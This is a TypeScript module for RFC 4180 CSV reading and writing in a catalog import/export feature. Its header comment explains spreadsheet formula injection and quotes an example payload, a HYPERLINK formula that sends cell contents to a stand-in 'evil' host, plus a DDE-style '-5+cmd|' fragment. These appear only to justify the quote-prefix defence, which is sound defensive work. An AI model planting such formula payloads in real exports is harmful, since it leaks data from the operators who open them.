/**
 * RFC 4180 CSV reading/writing for the catalog import/export (Issue #291) —
 * pure, no I/O, no dependency.
 *
 * ## Writing — formula-injection neutralisation
 *
 * A spreadsheet interprets a cell that starts with `=`, `+`, `-`, `@`, TAB or
 * CR as a formula, so a product name `=HYPERLINK("http://evil/?"&A1)` becomes
 * an exfiltration primitive the moment an operator opens the export.
 * {@link neutralizeCsvCell} prefixes such a cell with a single quote (`'`), the
 * OWASP-recommended defence; the spreadsheet then shows the text literally.
 *
 * One deliberate exemption: a cell that is, in full, a plain signed number
 * (`-5`, `+3`, `-0.25`) is written as-is. It cannot be a formula, and
 * quote-prefixing it would turn every negative number in the export into text.
 * Anything with so much as one further character (`-5+cmd|...`) is not a plain
 * number and IS neutralised.
 *
 * The import side reverses exactly this (`unneutralizeCsvCell`): a cell that
 * starts with `'` followed by a trigger character loses the quote, so an
 * export re-imports unchanged. (A genuine text value that begins with a quote
 * followed by a trigger character therefore loses the quote on re-import — the
 * accepted cost of making the defence reversible.)
 *
 * ## Reading
 *
 * UTF-8 (an optional BOM is stripped), `,` separator, `"` quoting with `""`
 * escapes, quoted fields may contain separators and line breaks, `\n`/`\r\n`/
 * `\r` all end a record, wholly empty lines are skipped. A bare `"` inside an
 * unquoted field, text after a closing quote, and an unterminated quoted field
 * are PARSE errors (never silently repaired — a repaired CSV imports different
 * data than the operator reviewed). Hard limits bound the work a hostile file
 * can cause.
 */

export const CSV_TRIGGER_CHARACTERS = ["=", "+", "-", "@", "\t", "\r"] as const;

const PLAIN_SIGNED_NUMBER = /^[+-]?[0-9]+(\.[0-9]+)?$/;

export function neutralizeCsvCell(value: string): string {
  if (value.length === 0) return value;
  const first = value[0] as string;
  if (!(CSV_TRIGGER_CHARACTERS as readonly string[]).includes(first)) {
    return value;
  }
  if (PLAIN_SIGNED_NUMBER.test(value)) return value;
  return `'${value}`;
}

/** Reverses {@link neutralizeCsvCell} on import. */
export function unneutralizeCsvCell(value: string): string {
  if (
    value.length >= 2 &&
    value[0] === "'" &&
    (CSV_TRIGGER_CHARACTERS as readonly string[]).includes(value[1] as string)
  ) {
    return value.slice(1);
  }
  return value;
}

/** RFC 4180 quoting: quote when the cell holds a comma, quote, CR or LF. */
export function quoteCsvCell(value: string): string {
  if (/[",\r\n]/.test(value)) return `"${value.replace(/"/g, '""')}"`;
  return value;
}

/** One cell as it is written: neutralise first, then quote. */
export function encodeCsvCell(value: string | null | undefined): string {
  if (value === null || value === undefined) return "";
  return quoteCsvCell(neutralizeCsvCell(value));
}

/** Serialises rows with CRLF line ends (RFC 4180) and a UTF-8 BOM so spreadsheets read non-ASCII text correctly. */
export function serializeCsv(
  rows: readonly (readonly (string | null | undefined)[])[],
  options: { bom?: boolean } = {}
): string {
  const body = rows
    .map((row) => row.map((cell) => encodeCsvCell(cell)).join(","))
    .join("\r\n");
  const text = rows.length > 0 ? `${body}\r\n` : "";
  return options.bom === false ? text : `﻿${text}`;
}

export type CsvLimits = {
  /** Maximum DATA rows (the header is not counted). */
  maxRows: number;
  maxColumns: number;
  maxCellLength: number;
};

export const DEFAULT_CSV_LIMITS: CsvLimits = {
  maxRows: 5000,
  maxColumns: 200,
  maxCellLength: 10_000
};

export type CsvRecord = {
  /** 1-based physical line the record starts on, for diagnostics. */
  line: number;
  cells: string[];
};

export type CsvParseResult =
  | { ok: true; header: CsvRecord; rows: CsvRecord[] }
  | { ok: false; line: number; message: string };

export function parseCsv(
  input: string,
  limits: CsvLimits = DEFAULT_CSV_LIMITS
): CsvParseResult {
  const text = input.charCodeAt(0) === 0xfeff ? input.slice(1) : input;
  const records: CsvRecord[] = [];

  let line = 1;
  let recordLine = 1;
  let cells: string[] = [];
  let cell = "";
  let inQuotes = false;
  let cellWasQuoted = false;
  let afterClosingQuote = false;
  // Tracks whether the in-progress RECORD (not just cell) used quoting, so a
  // line holding only `""` is a one-cell record rather than a skipped blank.
  let cellWasQuotedRecord = false;
  let index = 0;

  const fail = (message: string): CsvParseResult => ({
    ok: false,
    line,
    message
  });

  const endCell = (): CsvParseResult | null => {
    if (cell.length > limits.maxCellLength) {
      return fail(`a cell exceeds ${limits.maxCellLength} characters.`);
    }
    cells.push(cell);
    if (cells.length > limits.maxColumns) {
      return fail(`a row has more than ${limits.maxColumns} columns.`);
    }
    cell = "";
    cellWasQuoted = false;
    afterClosingQuote = false;
    return null;
  };

  const endRecord = (): CsvParseResult | null => {
    const failure = endCell();
    if (failure) return failure;
    const blank = cells.length === 1 && cells[0] === "" && !cellWasQuotedRecord;
    if (!blank) {
      if (records.length > limits.maxRows) {
        return fail(`the file has more than ${limits.maxRows} data rows.`);
      }
      records.push({ line: recordLine, cells });
    }
    cells = [];
    cellWasQuotedRecord = false;
    return null;
  };

  while (index < text.length) {
    const char = text[index] as string;

    if (char === "\u0000") return fail("the file contains a NUL character.");

    if (inQuotes) {
      if (char === '"') {
        if (text[index + 1] === '"') {
          cell += '"';
          index += 2;
          continue;
        }
        inQuotes = false;
        afterClosingQuote = true;
        index += 1;
        continue;
      }
      if (char === "\n") line += 1;
      cell += char;
      index += 1;
      continue;
    }

    if (char === '"') {
      if (cell.length > 0 || cellWasQuoted || afterClosingQuote) {
        return fail("a quote character appears inside an unquoted field.");
      }
      inQuotes = true;
      cellWasQuoted = true;
      cellWasQuotedRecord = true;
      index += 1;
      continue;
    }

    if (char === ",") {
      const failure = endCell();
      if (failure) return failure;
      index += 1;
      continue;
    }

    if (char === "\r" || char === "\n") {
      if (char === "\r" && text[index + 1] === "\n") index += 1;
      const failure = endRecord();
      if (failure) return failure;
      line += 1;
      recordLine = line;
      index += 1;
      continue;
    }

    if (afterClosingQuote) {
      return fail("unexpected text after the closing quote of a field.");
    }
    cell += char;
    index += 1;
  }

  if (inQuotes) return fail("a quoted field is never closed.");

  // A final record with no trailing line break.
  if (cell.length > 0 || cells.length > 0 || cellWasQuoted) {
    const failure = endRecord();
    if (failure) return failure;
  }

  const header = records.shift();
  if (!header) return { ok: false, line: 1, message: "the file is empty." };
  if (records.length > limits.maxRows) {
    return {
      ok: false,
      line: 1,
      message: `the file has more than ${limits.maxRows} data rows.`
    };
  }

  return { ok: true, header, rows: records };
}
